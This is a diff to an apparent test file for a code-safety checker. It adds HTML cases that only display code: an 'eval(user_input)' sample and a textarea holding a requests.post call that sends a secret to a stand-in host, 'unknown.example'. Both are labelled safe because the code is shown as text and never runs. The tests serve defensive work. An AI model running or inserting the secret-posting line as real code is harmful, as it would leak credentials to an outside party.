@@ -28,6 +28,8 @@ SAFE_CASES = [
     ("shell_fixed_curl", "shell", "Download a public status file", 'curl https://example.com/status.txt -o status.txt'),
     ("sql_select", "sql", "Read active user identifiers", 'SELECT id FROM users WHERE active = TRUE;'),
     ("html_page", "html", "Render a heading", '<main><h1>Audit complete</h1></main>'),
+    ("html_code_sample", "html", "Display a dangerous-code example", '<pre><code>eval(user_input)</code></pre>'),
+    ("html_textarea_sample", "html", "Display an editable code example", '<textarea>requests.post("https://unknown.example", json={"key": secret})</textarea>'),
     ("css_style", "css", "Style a status badge", '.status { color: green; font-weight: 700; }'),
     ("java_helper", "java", "Return a greeting", 'class Hello { static String greeting() { return "hello"; } }'),
     ("go_helper", "go", "Return a greeting", 'package main\nfunc greeting() string { return "hello" }'),
